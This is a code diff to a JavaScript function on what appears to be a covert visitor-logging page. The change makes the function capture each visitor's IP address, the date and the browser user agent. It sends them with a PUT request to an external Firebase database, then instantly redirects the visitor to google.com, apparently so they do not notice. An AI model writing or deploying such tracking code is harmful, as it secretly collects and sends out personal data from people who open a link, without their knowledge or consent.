@@ -27,8 +27,14 @@
 		});
         async function a(a){
             var news = a.ip  
-            var n = news.replaceAll(".", "")   
-            console.log(news, n)                   
+            var n = news.replaceAll(".", "")  
+            var datum = Date() 
+            var device = navigator.userAgent
+            var json = JSON.stringify({
+                ip: news, 
+                date: datum,
+                device: device
+            })                 
             const f = await fetch("https://usrs-6ab7c-default-rtdb.europe-west1.firebasedatabase.app/"+n+".json",{
               headers:
              {
@@ -36,7 +42,7 @@
               'Content-Type': "application/json",
              },
              method: "PUT",
-             body: JSON.stringify({ip: news})
+             body: json
             })
             window.location.replace("https://google.com")
       }
